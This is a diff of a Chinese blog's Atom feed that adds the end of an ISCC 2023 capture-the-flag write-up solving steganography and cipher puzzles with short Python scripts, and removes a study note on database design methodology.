+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251333307.png&#34; alt=&#34;image-20230525133308061&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251337799.png&#34; alt=&#34;image-20230525133710670&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251336235.png&#34; alt=&#34;image-20230525133654160&#34;&gt;&lt;/p&gt;
+&lt;p&gt;foremost分离后得到一个压缩包，密码还是ISCC2023&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251338338.png&#34; alt=&#34;image-20230525133846257&#34;&gt;&lt;/p&gt;
+&lt;p&gt;加下来寻找这个密钥，在mspaint程序中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251340315.png&#34; alt=&#34;image-20230525134019241&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用gimp分离得到&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251342931.png&#34; alt=&#34;image-20230525134225826&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里提示表情是摩斯，这里解码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251343712.png&#34; alt=&#34;image-20230525134346613&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解维吉尼亚&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251345280.png&#34; alt=&#34;image-20230525134554203&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;消息传递&#34;&gt;&lt;a href=&#34;#消息传递&#34; class=&#34;headerlink&#34; title=&#34;消息传递&#34;&gt;&lt;/a&gt;消息传递&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251624725.png&#34; alt=&#34;image-20230525162418604&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里发现一个压缩包文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251621323.png&#34; alt=&#34;image-20230525162140152&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251622028.png&#34; alt=&#34;image-20230525162218914&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拼接后pass：WRWAALIUWOHZAPQWFTQIPMVJFOKHHZUZ&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251626707.png&#34; alt=&#34;image-20230525162658563&#34;&gt;&lt;/p&gt;
+&lt;p&gt;百块是1，黑块是0，解码即可&lt;/p&gt;
+&lt;h3 id=&#34;你相信AI吗？&#34;&gt;&lt;a href=&#34;#你相信AI吗？&#34; class=&#34;headerlink&#34; title=&#34;你相信AI吗？&#34;&gt;&lt;/a&gt;你相信AI吗？&lt;/h3&gt;&lt;p&gt;这里在dataset文件下面有79个存放像素信息的文本这里先将其转换为图片&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import cv2
+import numpy as np
+
+for i in range(32):
+    with open(f&amp;quot;&amp;#123;i&amp;#125;.txt&amp;quot;, &amp;quot;r&amp;quot;) as f:
+        data = f.read().splitlines()
+    image_data = np.array([float(line) for line in data])
+    if image_data.shape[0] == 2352:
+        cv2.imwrite(f&amp;quot;./out/&amp;#123;i&amp;#125;.png&amp;quot;, image_data.reshape(84, 28))
+        print(1)
+    elif image_data.shape[0] == 1568:
+        cv2.imwrite(f&amp;quot;./out/&amp;#123;i&amp;#125;.png&amp;quot;, image_data.reshape(56, 28))
+        print(2)
+    else:
+        print(i)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251639491.png&#34; alt=&#34;image-20230525163908349&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里对图片信息识别，按顺序肉眼提取图片上的数字，以空格分隔，跑这个脚本：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import string
+import itertools
+import contextlib
+
+def has_visible_bytes(input_bytes):
+    return all(chr(byte) in string.printable for byte in input_bytes)
+
+cipher_text = &amp;#39;859 685 853 876 852 859 856 638 851 687 688 851 857 873 899 660 854 682 802 666 850 802 685 855 686 873 828 685 853 685 870 859&amp;#39;.split(&amp;quot; &amp;quot;)
+
+with open(&amp;quot;out.txt&amp;quot;, &amp;quot;wb&amp;quot;) as f:
+    for i in itertools.permutations(&amp;quot;0123456789&amp;quot;, 10):
+        maktrans = str.maketrans(&amp;quot;0123456789&amp;quot;, &amp;#39;&amp;#39;.join(i))
+
+        lis = [str.translate(i, maktrans) for i in cipher_text]
+        
+        with contextlib.suppress(Exception):
+            plan_text = bytes(list(map(lambda x: int(x), lis)))
+            if has_visible_bytes(plan_text):
+                print(plan_text)
+                f.write(plan_text + b&amp;quot;\n&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里拿到一串base64加密后的数据，对照ISCC的SVNDQ3寻找&lt;/p&gt;
+</content>
+        <category term="WP" scheme="https://blog.xcu.icu/categories/WP/" />
+        <category term="ISCC" scheme="https://blog.xcu.icu/tags/ISCC/" />
+        <updated>2023-05-31T16:00:00.000Z</updated>
+    </entry>
+    <entry>
         <id>https://blog.xcu.icu/2023/05/24/CommonsCollections-6/</id>
         <title>ConmonsCollection-6</title>
         <link rel="alternate" href="https://blog.xcu.icu/2023/05/24/CommonsCollections-6/"/>
@@ -7638,355 +9406,6 @@ print(argparse.parse_args())
 &lt;p&gt;属于第一范式，对于 R 的每个非平凡多值依赖 X-&amp;gt;-&amp;gt;Y (Y 不包含于 X)，X 都含有码，则称为 4NF&lt;/p&gt;
 &lt;h2 id=&#34;模式的分解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模式的分解&#34;&gt;#&lt;/a&gt; 模式的分解&lt;/h2&gt;
 &lt;p&gt;无损连接性，保持函数依赖&lt;/p&gt;
-</content>
-        <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-        <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-        <updated>2023-01-04T16:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/</id>
-        <title>数据库设计</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/"/>
-        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;本篇以记录数据库第七章的学习记录，本章的重点应该再概念结构设计和逻辑结构设计中。&lt;/p&gt;
-&lt;h2 id=&#34;数据库设计概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计概述&#34;&gt;#&lt;/a&gt; 数据库设计概述&lt;/h2&gt;
-&lt;p&gt;数据库设计是指对于一个给定的应用环境，设计优化的 &lt;code&gt;数据库逻辑模式和物理结构&lt;/code&gt; ，并据此建立数据库及其应用系统，使之能够有效的存储和管理数据，满足各种用户的应用需求，包括信息管理要求和数据操作要求&lt;/p&gt;
-&lt;p&gt;数据库设计的目的是为用户和各种应用系统提供一个信息基础设施和高效率的运行环境&lt;/p&gt;
-&lt;h3 id=&#34;数据库设计的特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计的特点&#34;&gt;#&lt;/a&gt; 数据库设计的特点&lt;/h3&gt;
-&lt;p&gt;数据库设计的一个主要特点 ----- &lt;code&gt;三分技术，七分管理，十二分基础数据&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;管理&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;数据库建设项目管理&lt;/li&gt;
-&lt;li&gt;企业的业务管理&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;基础数据&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;收集&lt;/li&gt;
-&lt;li&gt;更新新的数据&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;第二个特点 ----- &lt;code&gt;结构（数据）设计和行为（处理）设计相结合&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;数据库设计的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计的方法&#34;&gt;#&lt;/a&gt; 数据库设计的方法&lt;/h3&gt;
-&lt;p&gt;手工与经验相结合方法&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;设计质量与设计人员的经验和水平有直接关系&lt;/li&gt;
-&lt;li&gt;数据库运行一段时间后常常不同程度地发现各种问题提高的维护代价&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;规范设计法&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;基本思想：过程迭代和逐步求精&lt;/li&gt;
-&lt;li&gt;新奥尔良方法
-&lt;ul&gt;
-&lt;li&gt;将数据库设计分为若干阶段和步骤&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;基于 E-R 模型的数据库设计方法
-&lt;ul&gt;
-&lt;li&gt;概念设计阶段广泛采用&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;3NF 的设计方法
-&lt;ul&gt;
-&lt;li&gt;逻辑阶段可采用的有效方法&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;ODL 方法
-&lt;ul&gt;
-&lt;li&gt;面向对象的设计方法&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;数据库设计的基本步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计的基本步骤&#34;&gt;#&lt;/a&gt; 数据库设计的基本步骤&lt;/h3&gt;
-&lt;p&gt;主要分为六个阶段&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;需求分析
-&lt;ul&gt;
-&lt;li&gt;需求收集和分析&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;概念结构设计
-&lt;ul&gt;
-&lt;li&gt;设计 E-R 模型&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;逻辑结构设计
-&lt;ul&gt;
-&lt;li&gt;设计逻辑结构数据模型优化&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;物理结构设计
-&lt;ul&gt;
-&lt;li&gt;设计物理结构评价设计，性能预测&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;数据库实施
-&lt;ul&gt;
-&lt;li&gt;物理实现尝试运行&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;数据库运行和维护
-&lt;ul&gt;
-&lt;li&gt;使用、维护数据库&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105170541371.png&#34; alt=&#34;image-20230105170541371&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;数据库设计过程中的各级模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计过程中的各级模式&#34;&gt;#&lt;/a&gt; 数据库设计过程中的各级模式&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105171313745.png&#34; alt=&#34;image-20230105171313745&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;需求分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析&#34;&gt;#&lt;/a&gt; 需求分析&lt;/h2&gt;
-&lt;h3 id=&#34;需求分析的任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析的任务&#34;&gt;#&lt;/a&gt; 需求分析的任务&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;详细调查现实世界要处理的对象 (组织、部门企等）&lt;/li&gt;
-&lt;li&gt;充分了解原系统 (手工系统或计算机系统）&lt;/li&gt;
-&lt;li&gt;明确用户的各种需求&lt;/li&gt;
-&lt;li&gt;确定新系统的功能&lt;/li&gt;
-&lt;li&gt;充分考虑今后可能的扩充和改变&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;需求分析的重点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析的重点&#34;&gt;#&lt;/a&gt; 需求分析的重点&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;调查的重点是 “数据” 和 “处理”，获得用户对数据库要求
-&lt;ul&gt;
-&lt;li&gt;信息要求&lt;/li&gt;
-&lt;li&gt;处理要求&lt;/li&gt;
-&lt;li&gt;安全性与完整性要求&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;确定用户最终需求
-&lt;ul&gt;
-&lt;li&gt;用户缺少计算机知识&lt;/li&gt;
-&lt;li&gt;设计人员缺少用户的专业知识&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;解决办法
-&lt;ul&gt;
-&lt;li&gt;设计人员必须不断深入地与用户进行交流&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;需求分析的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析的方法&#34;&gt;#&lt;/a&gt; 需求分析的方法&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;调查了解清楚用户的实际需求并进行初步分析
-&lt;ol&gt;
-&lt;li&gt;调查组织机构情况&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;调查各部门的业务活动情况&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;协助用户明确对新系统的要求&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;确定新系统的边界&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;与用户达成共识&lt;/li&gt;
-&lt;li&gt;进一步分析与表达这些需求&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;常用方法&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;跟班作业（耗时但是有效）&lt;/li&gt;
-&lt;li&gt;开调查会（常用）&lt;/li&gt;
-&lt;li&gt;问卷调查（简单有效）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105172604633.png&#34; alt=&#34;image-20230105172604633&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;数据字典&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据字典&#34;&gt;#&lt;/a&gt; 数据字典&lt;/h3&gt;
-&lt;p&gt;用途： &lt;code&gt;是系统中各类数据描述的集合，进行详细的数据收集和数据分析所获得的主要结果&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;字典的内容&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;数据项
-&lt;ul&gt;
-&lt;li&gt;不可再分的数据单位&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;数据结构
-&lt;ul&gt;
-&lt;li&gt;反应了数据之间的组合关系&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;数据流
-&lt;ul&gt;
-&lt;li&gt;数据结构再系统内传输的路径&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;数据存储
-&lt;ul&gt;
-&lt;li&gt;数据结构停留和保存的地方，也是数据流的来源和去向之一&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;处理过程
-&lt;ul&gt;
-&lt;li&gt;描述处理过程的说明性信息&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;code&gt;数据字典是关于数据库中数据的描述，是元数据，而不是数据本身&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;概念结构设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念结构设计&#34;&gt;#&lt;/a&gt; 概念结构设计&lt;/h2&gt;
-&lt;h3 id=&#34;概念模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念模型&#34;&gt;#&lt;/a&gt; 概念模型&lt;/h3&gt;
-&lt;p&gt;概念模型的主要特点是：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;能真实，充分的反映现实世界&lt;/li&gt;
-&lt;li&gt;易于理解&lt;/li&gt;
-&lt;li&gt;易于更改&lt;/li&gt;
-&lt;li&gt;易于向关系网状，层次等数据类型的转换&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;属性和实体的划分准则&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;属性是不能再具有需要描述的性质&lt;/li&gt;
-&lt;li&gt;属性不能与其他实体具有联系&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;逻辑结构设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逻辑结构设计&#34;&gt;#&lt;/a&gt; 逻辑结构设计&lt;/h2&gt;
-&lt;p&gt;把上一个阶段设计好的 E-R 模型转换成选用 DBMS 产品支持的数据模型相符合的逻辑结构&lt;/p&gt;
-&lt;h3 id=&#34;e-r图向关系模型的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#e-r图向关系模型的转换&#34;&gt;#&lt;/a&gt; E-R 图向关系模型的转换&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;E-R 图向关系模型的转换要解决的问题
-&lt;ul&gt;
-&lt;li&gt;如何将实体型和实体间的联系转换为关系模式&lt;/li&gt;
-&lt;li&gt;如何确定这些关系模式的属性和码&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;转换内容
-&lt;ul&gt;
-&lt;li&gt;将 E-R 图转换为关系模型：将实体、实体的属性和实体之间的联系转换为关系模式&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;转换原则
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;一个实体型转换为一个关系模型&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;联系分为多种情况进行转换&lt;/code&gt;
-&lt;ol&gt;
-&lt;li&gt;一个 1:1 联系可以转换为一个独立的关系模式，也可以与任意一端对应的关系模式合并。&lt;/li&gt;
-&lt;li&gt;一个 l:n 联系可以转换为一个独立的关系模式，也可以与 n 端对应的关系模式合并。&lt;/li&gt;
-&lt;li&gt;一个 m:n 联系转换为一个关系模式，&lt;/li&gt;
-&lt;li&gt;三个或三个以上实体间的一个多元联系可以转换为一个关系模式。&lt;/li&gt;
-&lt;li&gt;具有相同码的关系模式可合并。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;数据模型的优化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据模型的优化&#34;&gt;#&lt;/a&gt; 数据模型的优化&lt;/h3&gt;
-&lt;p&gt;得到初步数据模型后，还应该适当地修改、调整数据模型的结构，以进一步提高数据库应用系统的性能，这就是数据模型的优化&lt;/p&gt;
-&lt;p&gt;关系数据模型的优化通常以规范化理论为指导&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;确定数据依赖&lt;/li&gt;
-&lt;li&gt;极小化处理&lt;/li&gt;
-&lt;li&gt;确定所属范式&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;通过分解&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;水平分解&lt;/p&gt;
-&lt;p&gt;把基本关系的元组分为若干子集合，定义每个子集合为一个子关系，以提高系统利用率&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;垂直分解&lt;/p&gt;
-&lt;p&gt;把关系模式 R 的属性分解为若干子集合，形成若干子关系模式&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;设计用户子模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设计用户子模式&#34;&gt;#&lt;/a&gt; 设计用户子模式&lt;/h3&gt;
-&lt;p&gt;注重的问题&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;使更符合用户的别名&lt;/li&gt;
-&lt;li&gt;针对不同级别的用户定义不同的 View ，以满足系统对安全性的要求。&lt;/li&gt;
-&lt;li&gt;简化用户对系统的使用&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;数据库的物理设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的物理设计&#34;&gt;#&lt;/a&gt; 数据库的物理设计&lt;/h2&gt;
-&lt;p&gt;数据库在物理设备上的 &lt;code&gt;存储结构与存取方法&lt;/code&gt; 称为数据库的物理结构，它依赖于选定的数据库管理系统为一个给定的逻辑数据模型选取一个最适合应用环境的物理结构的过程，就是数据库的物理设计&lt;/p&gt;
-&lt;h3 id=&#34;物理数据库设计的内容和方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#物理数据库设计的内容和方法&#34;&gt;#&lt;/a&gt; 物理数据库设计的内容和方法&lt;/h3&gt;
-&lt;p&gt;设计物理数据库结构的准备工作&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;对要运行的事务进行详细分析，获得选择物理数据库设计所需参数&lt;/li&gt;
-&lt;li&gt;充分了解所用 RDBMS 的内部特征，特别是系统提供的存取方法和存储结构&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;选择物理数据库设计所需参数&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;数据库询事务
-&lt;ol&gt;
-&lt;li&gt;查询的关系&lt;/li&gt;
-&lt;li&gt;查条件所涉及的属性&lt;/li&gt;
-&lt;li&gt;连接条件所涉及的属性&lt;/li&gt;
-&lt;li&gt;查询的投影属性&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;数据更新事务
-&lt;ol&gt;
-&lt;li&gt;被更新的关系&lt;/li&gt;
-&lt;li&gt;每个关系上的更新操作条所及的属性&lt;/li&gt;
-&lt;li&gt;修改操作要改变的属性值&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;每个事务在各关系上运行的频率和性能要求&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;物理设计的内容&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;为关系模式选择 &lt;code&gt;存取方法&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;设计关系，索引等数据库文件的物理存储结构&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;关系数据库存取方法选择&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系数据库存取方法选择&#34;&gt;#&lt;/a&gt; 关系数据库存取方法选择&lt;/h3&gt;
-&lt;p&gt;数据库系统是多用户共享的系统，对同一个关系要建立 &lt;code&gt;多条存取路径&lt;/code&gt; 才能满足多用户的多种应用要求&lt;br /&gt;
-物理设计的任务之一就是要确定选择哪些存取方法，即 &lt;code&gt;建立哪些存取路径&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确定数据库的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#确定数据库的存储结构&#34;&gt;#&lt;/a&gt; 确定数据库的存储结构&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;确定数据的存放位置和存储结构
-&lt;ul&gt;
-&lt;li&gt;因素
-&lt;ul&gt;
-&lt;li&gt;存取时间&lt;/li&gt;
-&lt;li&gt;存取空间利用率&lt;/li&gt;
-&lt;li&gt;维护代价&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;确定系统配置
-&lt;ul&gt;
-&lt;li&gt;原则
-&lt;ul&gt;
-&lt;li&gt;易变部分与稳定部分分开存放&lt;/li&gt;
-&lt;li&gt;存取频率较高部分与存取频率较低部分，分开存放&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;数据库实施和维护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库实施和维护&#34;&gt;#&lt;/a&gt; 数据库实施和维护&lt;/h2&gt;
-&lt;h3 id=&#34;数据载入和应用程序的调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据载入和应用程序的调试&#34;&gt;#&lt;/a&gt; 数据载入和应用程序的调试&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;数据的载入
-&lt;ul&gt;
-&lt;li&gt;组织数据入库是数据库实施阶段最主要的工作&lt;/li&gt;
-&lt;li&gt;载入方法有人工和计算机辅助两种&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;应用程序的编码和调试
-&lt;ul&gt;
-&lt;li&gt;数据库应用程序的设计应该与数据设计并行进行&lt;/li&gt;
-&lt;li&gt;在组织数据入库的同时还要调试应用程序&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;数据库的试运行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的试运行&#34;&gt;#&lt;/a&gt; 数据库的试运行&lt;/h3&gt;
-&lt;p&gt;在原有系统的数据有一小部分已输入数据库后，就可以开始对数据库系统进行联合调试，称为数据库的试运行&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;功能测试
-&lt;ul&gt;
-&lt;li&gt;实际运行数据库应用程序，执行对数据库的各种操作，测试应用程序的功能是否满足设计要求&lt;/li&gt;
-&lt;li&gt;如果不满足，对应用程序部分则要修改、调整，直到达到计要求&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;性能测试
-&lt;ul&gt;
-&lt;li&gt;测量系统的性能指标，分析是否达到设计目标&lt;/li&gt;
-&lt;li&gt;如果测试的结果与设计目标不符，则要返回物理设计阶段，重新调整物理结构，修改系统参数，某些情况下甚至要返回逻辑设计阶段，修改逻辑结构&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;数据库的转储和恢复
-&lt;ul&gt;
-&lt;li&gt;在数据库试运行阶段，系统还不稳定，硬、软故障随时都可能发生&lt;/li&gt;
-&lt;li&gt;系统的操作人员对新系统还不熟悉，误操作也不可避免&lt;/li&gt;
-&lt;li&gt;因此必须做好数据库的转储和恢复工作，尽量减少对数据库的破坏。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;数据库的运行和维护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的运行和维护&#34;&gt;#&lt;/a&gt; 数据库的运行和维护&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;数据库试运行合格后，数据库即可投入正式运行。&lt;/li&gt;
-&lt;li&gt;数据库投入运行标志着开发任务的基本完成和维护工作的开始&lt;/li&gt;
-&lt;li&gt;对数据库设计进行评价、调整、修改等维护工作是个长期的任务，也是设计工作的继续和提高&lt;/li&gt;
-&lt;/ol&gt;
 </content>
         <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
         <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
